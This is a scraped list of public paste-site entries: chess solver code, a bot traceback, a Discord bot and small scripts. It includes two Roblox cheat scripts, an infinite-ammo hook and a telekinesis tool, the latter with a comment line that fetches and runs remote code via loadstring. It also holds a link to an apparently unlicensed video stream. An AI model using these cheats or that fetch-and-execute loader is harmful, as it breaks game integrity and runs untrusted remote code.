            #break  # Ukončíme hlavní smyčku, pokud nedošlo ke změně v poslední iteraci
    


def print_draw_positions(AR):
    """"""
    Vytiskne všechny remízové pozice (hodnota 0) zaznamenané v slovníku AR.
    """"""
    print(""Remízové pozice:"")
    for fen, value in AR.items():
        if True or (value > 990 and value < 1000):
            print(f""FEN>: {fen}, Hodnota: {value}"",""\n"",chess.Board(fen),""<\n"")

def find_path_to_end(AR, fen):
    if AR[fen]['result'] is None:
        print(f""Unfortunately, there is no path that is known to be the best"")
    
    fen_i = fen
    print(chess.Board(fen_i),""\n<"")
    path = fen
    while AR[fen_i]['best_child'] is not None:
        fen_i = AR[fen_i]['best_child']
        print(chess.Board(fen_i),AR[fen_i],""\n\n<<<<"")
        
        path = path + "", "" + fen_i
    
    print(f""Path is: {path}"")
    
 
            
def main():

    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen_original = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    initial_fen_mate_in_one_aka_one_ply = ""3r1k2/5r1p/5Q1K/2p3p1/1p4P1/8/8/8 w - - 2 56""
    initial_fen_mate_in_two_aka_three_plies = ""r5k1/2r3p1/pb6/1p2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 b - - 4 28""
    initial_fen_mated_in_two_plies = ""r5k1/2r3p1/p7/bp2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 w - - 5 29""
    
    mate_in_two_aka_three_plies_simple = ""8/8/8/8/3R4/5K2/8/4k3 w - - 0 1""
    mated_in_one_aka_two_plies_simple = ""8/8/3R4/8/8/5K2/8/4k3 b - - 1 1""
    mate_in_one_aka_one_ply_simple = ""8/8/3R4/8/8/5K2/8/5k2 w - - 2 2""

    initial_fen = mate_in_two_aka_three_plies_simple
    
    
    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""1k6/8/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/8/8/7N/1k5K/6B1 w - - 0 1""
    initial_fen = ""7K/8/k1P5/7p/8/8/8/8 w - - 0 1""
    initial_fen = ""8/3k4/8/2K2R2/8/8/8/8 w - - 0 1""
   
    simplified_fen = simplify_fen_string(initial_fen)
    
    board = chess.Board(initial_fen)
    AR = {simplified_fen: {""result"": None, ""last_move"": None, ""children"": None, ""best_child"": None}}  # Inicializace AR s počáteční pozicí
    
    update_AR_for_mate_in_k(board, AR, simplified_fen, max_k=58)  # Aktualizace AR
    
    #print_draw_positions(AR)
    print(f""AR for initial fen is = {AR[simplified_fen]}"")
    find_path_to_end(AR, simplified_fen)
    

main()"
yMUVktUW,ServerError: received 504 HTTP response,basedcount_bot,Python,Thursday 18th of April 2024 11:19:35 AM CDT,"Traceback (most recent call last):
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/root/Bots/basedcount_bot/basedcount_bot.py"", line 123, in check_mail
    async for message in reddit_instance.inbox.unread(limit=None):  # Message
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 34, in __anext__
    await self._next_batch()
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 89, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 785, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 567, in _objectify_request
    await self.request(
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 51, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1032, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 305, in _request_with_retries
    return await self._do_retry(
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 170, in _do_retry
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 305, in _request_with_retries
    return await self._do_retry(
           ^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 170, in _do_retry
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/root/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 322, in _request_with_retries
    raise self.STATUS_EXCEPTIONS[response.status](response)
asyncprawcore.exceptions.ServerError: received 504 HTTP response
"
iX3Z9d6u,Infinite Ammo,LuckyScripters,Lua,Thursday 18th of April 2024 11:17:30 AM CDT,"-- Roblox - SharkBite - Infinite Ammo
-- Made by LuckyScripters

for index, closure in getgc() do
    if type(closure) == ""function"" and not checkclosure(closure) then
        if getinfo(closure).name == ""reload"" then
            hookfunction(closure, function()
                return
            end)
        end
        if getinfo(closure).name == ""reload"" or getinfo(closure).name == ""fireWeapon"" then
            for index, upValue in getupvalues(closure) do
                if typeof(upValue) == ""number"" then
                    setupvalue(closure, index, math.huge)
                end
            end
        end
    end
end"
2eNrVUTB,need,Nil000,Email,Thursday 18th of April 2024 11:16:07 AM CDT,"Hello, I am in need of Bitcoin Testnet coins, if anybody can help me I would be very grateful!
Once I am done testing, I will send all the coins back to the original donating address.
---
ANY AMOUNT HELPS!!!
---
My Bitcoin Testnet address is: mrLGSHqb7oLb33PMDq5kZCzQsDFhqd5aLN"
juhFUJmY,Mad,Unknown_No_1,PHP,Thursday 18th of April 2024 11:13:39 AM CDT,NoFlashHackModMainAccount
UgNMiu6F,I-LAND 2,ktvchains,Perl,Thursday 18th of April 2024 10:49:15 AM CDT,"# EN, 1080p
# this is the live recording; the regular version can be watched on the next day on viki (free, worldwide)
 
# E1 240418
[!ads] watch/dl: https://filemoon.sx/d/omu4hj0wad9g"
k6S6p0dh,Install Slade Doom Editor,metalx1000,Bash,Thursday 18th of April 2024 10:46:28 AM CDT,"# Quickly download and install the latest version of Slade for Debian/Linux
deb=""$(wget -qO- ""https://debian.drdteam.org/pool/multiverse/s/slade/""|grep amd|tail -n1|cut -d\> -f7|cut -d\< -f1)""
wget ""https://debian.drdteam.org/pool/multiverse/s/slade/${deb}"" -O /tmp/slade.deb
sudo dpkg -i /tmp/slade.deb
sudo apt --fix-broken install -y"
88ijFwP1,Emojify,NaroxEG,Python,Thursday 18th of April 2024 09:58:23 AM CDT,"import discord
from discord.ext import commands
from dotenv import load_dotenv
import os
from PIL import Image
from io import BytesIO

load_dotenv()
TOKEN = os.environ.get(""TOKEN"")

client = commands.Bot(command_prefix=""!"", intents=discord.Intents.default())
tree = client.tree

@client.event
async def on_ready():
    print(f""Logged in as {client.user}"")
    synced = await tree.sync()
    print(f""Synced {len(synced)} Command(s)."")

new_size = 32

COLORS = {
    (49, 55, 61):    ""⬛"",
    (85, 172, 238):  ""🟦"",
    (221, 46, 68):   ""🟥"",
    (253, 203, 88):  ""🟨"",
    (193, 105, 79):  ""🟫"",
    (244, 144, 12):  ""🟧"",
    (170, 142, 214): ""🟪"",
    (230, 231, 232): ""⬜"",
    (120, 177, 89):  ""🟩"",
}


@tree.command(name=""emojify"", description=""converts image into emojis of pixels"")
async def _emojify(interaction: discord.Interaction, image: discord.Attachment):
    await interaction.response.defer()

    with BytesIO(await image.read()) as file:
        resized = Image.open(file).resize((new_size, new_size), resample=Image.NEAREST).convert(""RGB"")    
    msg = convertPixels(resized)

    await interaction.followup.send(f""```{msg}```"")


def convertPixels(img: Image.Image):
    pixelsArray = img.load()
    emojified = """"
    
    width, height = img.size

    for row in range(height):
        for column in range(width):
            nearestColor = getNearestColor(pixelsArray[column, row])
            emojified += nearestColor            
        emojified += '\n'
    return emojified

def getNearestColor(pixels: tuple):
    distancesList = []

    for refPixels, color in COLORS.items():
        r1, g1, b1 = refPixels
        r2, g2, b2 = pixels
        distance = ((r2-r1)**2 + (g2-g1)**2 + (b2-b1)**2) ** 0.5
        
        distancesList.append(distance)

    sortedList = sorted(distancesList)
    idx = distancesList.index(sortedList[0])

    return list(COLORS.values())[idx]

client.run(TOKEN)"
iimhPaMX,Win+C To Open Calc (redundant).ahk,Lorenzo501,Autohotkey,Thursday 18th of April 2024 09:55:41 AM CDT,"; no clue why I had the two extra instructions though

#Requires AutoHotkey 2.0
#c::Run(""Calc""), WinWait(""Calculator ahk_class ApplicationFrameWindow""), WinActivate()"
pJvG0LJK,Untitled,Igor150195,JavaScript,Thursday 18th of April 2024 09:28:57 AM CDT,"window.addEventListener('DOMContentLoaded', function () {
    let timeout;

    function setEqualHeight() {
        let items = document.querySelectorAll('.review-item');
        let maxHeight = Math.max(...Array.from(items, item => {
            item.style.height = '';
            return item.offsetHeight;
        }));
        items.forEach(item => item.style.height = `${maxHeight}px`);
    };

    document.fonts.ready
        .then(() => {
            setTimeout(function () {
                setEqualHeight();
            }, 100)
        })
        .catch(() => {
            console.log(""Fonts loading error"");
        });

    window.addEventListener('resize', ()=> {
        if (timeout) {
            clearInterval(timeout);
        };

        timeout = setTimeout(() => {
            setEqualHeight();
        }, 50);
    });
});

"
St5kw7n8,Artist Diff,branch_m,JavaScript,Thursday 18th of April 2024 09:19:53 AM CDT,"var trgt=0;
const st=t[""playerstats""][""stats""];
for(var i=0;i<st.length;i++){
    if(st[i].name==""DBD_Chapter22_Slasher_Stat1""){trgt = st[i].value;break;}};"
N8dE1fnw,RayCrow,branch_m,JavaScript,Thursday 18th of April 2024 09:17:16 AM CDT,"var count=0;const tz=""Asia/Tokyo"";const ty=""2-digit"";
const s=c[""playerstats""][""stats""];
for(var i=0;i<s.length;i++){
    if(s[i].name==""DBD_Chapter22_Slasher_Stat1""){count = s[i].value;break;}};"
xjXXU9U1,Doom zscript GZdoom run at level start,metalx1000,C,Thursday 18th of April 2024 09:13:19 AM CDT," class HelloWorldHandler : EventHandler
 {
     override void WorldLoaded (WorldEvent e)
     {
          
          //displayes messages to console
         console.printf(""Hello World!"");
         Console.Printf(TEXTCOLOR_BLUE .. ""Hello\n"");

         //Play a Sound
         S_StartSound (""grunt/death"", CHAN_VOICE);
     }
 }

  // Put this in a MAPINFO lump
 gameinfo
 {
     AddEventHandlers = ""HelloWorldHandler""
 }

"
t6G4CQGU,Untitled,yurghie,YAML,Thursday 18th of April 2024 08:32:46 AM CDT,"sensor:
  - platform: nordpool
    VAT: true
    currency: ""NOK""
    price_in_cents: false
    low_price_cutoff: 0.95
    region: ""Kr.sand""
    precision: 4
    price_type: kWh
    additional_costs: >-
      {% set s = {
        ""paaslag"": 0.00,
        ""nettleie_natt"": 0.38,
        ""nettleie_dag"": 0.50
      }%}
      {% set add_cost = 0.9 * (current_price - 0.9125) * -1 if current_price > 0.9125 else 0 %}
      {% set add_cost = s.paaslag + add_cost + s.nettleie_dag if now().hour >=6 and now().hour < 22 else s.paaslag + add_cost + s.nettleie_natt %}
      {{add_cost | float(3) }}"
cJTXQWQx,FE Telekineses (Script) #1,Dark_Agent,Lua,Thursday 18th of April 2024 07:01:30 AM CDT,"-- Q & E - bring closer and further
-- R - Roates Block
-- T - Tilts Block
-- Y - Throws Block
-- loadstring(game:HttpGet(""https://pastebin.com/raw/cJTXQWQx""))()
local function a(b, c)
    local d = getfenv(c)
    local e =
        setmetatable(
        {},
        {__index = function(self, f)
                if f == ""script"" then
                    return b
                else
                    return d[f]
                end
            end}
    )
    setfenv(c, e)
    return c
end
local g = {}
local h = Instance.new(""Model"", game:GetService(""Lighting""))
local i = Instance.new(""Tool"")
local j = Instance.new(""Part"")
local k = Instance.new(""Script"")
local l = Instance.new(""LocalScript"")
local m = sethiddenproperty or set_hidden_property
i.Name = ""Telekinesis""
i.Parent = h
i.Grip = CFrame.new(0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0)
i.GripForward = Vector3.new(-0, -1, -0)
i.GripRight = Vector3.new(0, 0, 1)
i.GripUp = Vector3.new(1, 0, 0)
j.Name = ""Handle""
j.Parent = i
j.CFrame = CFrame.new(-17.2635937, 15.4915619, 46, 0, 1, 0, 1, 0, 0, 0, 0, -1)
j.Orientation = Vector3.new(0, 180, 90)
j.Position = Vector3.new(-17.2635937, 15.4915619, 46)
j.Rotation = Vector3.new(-180, 0, -90)
j.Color = Color3.new(0.0666667, 0.0666667, 0.0666667)
j.Transparency = 1
j.Size = Vector3.new(1, 1.20000005, 1)
j.BottomSurface = Enum.SurfaceType.Weld
j.BrickColor = BrickColor.new(""Really black"")
j.Material = Enum.Material.Metal
j.TopSurface = Enum.SurfaceType.Smooth
j.brickColor = BrickColor.new(""Really black"")
k.Name = ""LineConnect""
k.Parent = i
table.insert(
    g,
    a(
        k,
        function()
            wait()
            local n = script.Part2
            local o = script.Part1.Value
            local p = script.Part2.Value
            local q = script.Par.Value
            local color = script.Color
            local r = Instance.new(""Part"")
            r.TopSurface = 0
            r.BottomSurface = 0
            r.Reflectance = .5
            r.Name = ""Laser""
            r.Locked = true
            r.CanCollide = false
            r.Anchored = true
            r.formFactor = 0
            r.Size = Vector3.new(1, 1, 1)
            local s = Instance.new(""BlockMesh"")
            s.Parent = r
            while true do
                if n.Value == nil then
                    break
                end
                if o == nil or p == nil or q == nil then
                    break
                end
                if o.Parent == nil or p.Parent == nil then
                    break
                end
                if q.Parent == nil then
                    break
                end
                local t = CFrame.new(o.Position, p.Position)
                local dist = (o.Position - p.Position).magnitude
                r.Parent = q
                r.BrickColor = color.Value.BrickColor
                r.Reflectance = color.Value.Reflectance
                r.Transparency = color.Value.Transparency
                r.CFrame = CFrame.new(o.Position + t.lookVector * dist / 2)
                r.CFrame = CFrame.new(r.Position, p.Position)
                s.Scale = Vector3.new(.25, .25, dist)
                wait()
            end
            r:remove()
            script:remove()
        end
    )
)
k.Disabled = true
l.Name = ""MainScript""
l.Parent = i
table.insert(
    g,
    a(
        l,
        function()
            wait()
            tool = script.Parent
            lineconnect = tool.LineConnect
            object = nil
            mousedown = false
            found = false
            BP = Instance.new(""BodyPosition"")
            BP.maxForce = Vector3.new(math.huge * math.huge, math.huge * math.huge, math.huge * math.huge)
            BP.P = BP.P * 1.1
            dist = nil
            point = Instance.new(""Part"")
            point.Locked = true
            point.Anchored = true
            point.formFactor = 0
            point.Shape = 0
            point.BrickColor = BrickColor.Black()
            point.Size = Vector3.new(1, 1, 1)
            point.CanCollide = false
            local s = Instance.new(""SpecialMesh"")
            s.MeshType = ""Sphere""
            s.Scale = Vector3.new(.7, .7, .7)
            s.Parent = point
            handle = tool.Handle
            front = tool.Handle
            color = tool.Handle
            objval = nil
            local u = false
            local v = BP:clone()
            v.maxForce = Vector3.new(30000, 30000, 30000)
            function LineConnect(o, p, q)
                local w = Instance.new(""ObjectValue"")
                w.Value = o
                w.Name = ""Part1""
                local x = Instance.new(""ObjectValue"")
                x.Value = p
                x.Name = ""Part2""
                local y = Instance.new(""ObjectValue"")
                y.Value = q
                y.Name = ""Par""
                local z = Instance.new(""ObjectValue"")
                z.Value = color
                z.Name = ""Color""
                local A = lineconnect:clone()
                A.Disabled = false
                w.Parent = A
                x.Parent = A
                y.Parent = A
                z.Parent = A
                A.Parent = workspace
                if p == object then
                    objval = x
                end
            end
            function onButton1Down(B)
                if mousedown == true then
                    return
                end
                mousedown = true
                coroutine.resume(
                    coroutine.create(
                        function()
                            local C = point:clone()
                            C.Parent = tool
                            LineConnect(front, C, workspace)
                            while mousedown == true do
                                C.Parent = tool
                                if object == nil then
                                    if B.Target == nil then
                                        local t = CFrame.new(front.Position, B.Hit.p)
                                        C.CFrame = CFrame.new(front.Position + t.lookVector * 1000)
                                    else
                                        C.CFrame = CFrame.new(B.Hit.p)
                                    end
                                else
                                    LineConnect(front, object, workspace)
                                    break
                                end
                                wait()
                            end
                            C:remove()
                        end
                    )
                )
                while mousedown == true do
                    if B.Target ~= nil then
                        local D = B.Target
                        if D.Anchored == false then
                            object = D
                            dist = (object.Position - front.Position).magnitude
                            break
                        end
                    end
                    wait()
                end
                while mousedown == true do
                    if object.Parent == nil then
                        break
                    end
                    local t = CFrame.new(front.Position, B.Hit.p)
                    BP.Parent = object
                    BP.position = front.Position + t.lookVector * dist
                    wait()
                end
                BP:remove()
                object = nil
                objval.Value = nil
            end
            function onKeyDown(E, B)
                local E = E:lower()
                local F = false
                if E == ""q"" then
                    if dist >= 5 then
                        dist = dist - 10
                    end
                end
                if E == ""r"" then
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == ""BodyGyro"" then
                            return nil
                        end
                    end
                    BG = Instance.new(""BodyGyro"")
                    BG.maxTorque = Vector3.new(math.huge, math.huge, math.huge)
                    BG.cframe = CFrame.new(object.CFrame.p)
                    BG.Parent = object
                    repeat
                        wait()
                    until object.CFrame == CFrame.new(object.CFrame.p)
                    BG.Parent = nil
                    if object == nil then
                        return
                    end
                    for G, H in pairs(object:children()) do
                        if H.className == ""BodyGyro"" then
                            H.Parent = nil
                        end
                    end
                    object.Velocity = Vector3.new(0, 0, 0)
                    object.RotVelocity = Vector3.new(0, 0, 0)
                    object.Orientation = Vector3.new(0, 0, 0)
                end
                if E == ""e"" then
                    dist = dist + 10
                end
                if E == ""t"" then
                    if dist ~= 10 then
                        dist = 10
                    end
                end
                if E == ""y"" then
                    if dist ~= 200 then
                        dist = 200
                    end
                end
                if E == ""="" then
                    BP.P = BP.P * 1.5
                end
                if E == ""-"" then
                    BP.P = BP.P * 0.5
                end
            end
            function onEquipped(B)
                keymouse = B
                local I = tool.Parent
                human = I.Humanoid
                human.Changed:connect(
                    function()
                        if human.Health == 0 then
                            mousedown = false
                            BP:remove()
                            point:remove()
                            tool:remove()
                        end
                    end
                )
                B.Button1Down:connect(
                    function()
                        onButton1Down(B)
                    end
                )
                B.Button1Up:connect(
                    function()
                        mousedown = false
                    end
                )
                B.KeyDown:connect(
                    function(E)
                        onKeyDown(E, B)
                    end
                )
                B.Icon = ""rbxasset://textures\\GunCursor.png""
            end
            tool.Equipped:connect(onEquipped)
        end
    )
)
for J, H in pairs(h:GetChildren()) do
    H.Parent = game:GetService(""Players"").LocalPlayer.Backpack
    pcall(
        function()
            H:MakeJoints()
        end
    )
end
h:Destroy()
for J, H in pairs(g) do
    spawn(
        function()
            pcall(H)
        end
    )
end"
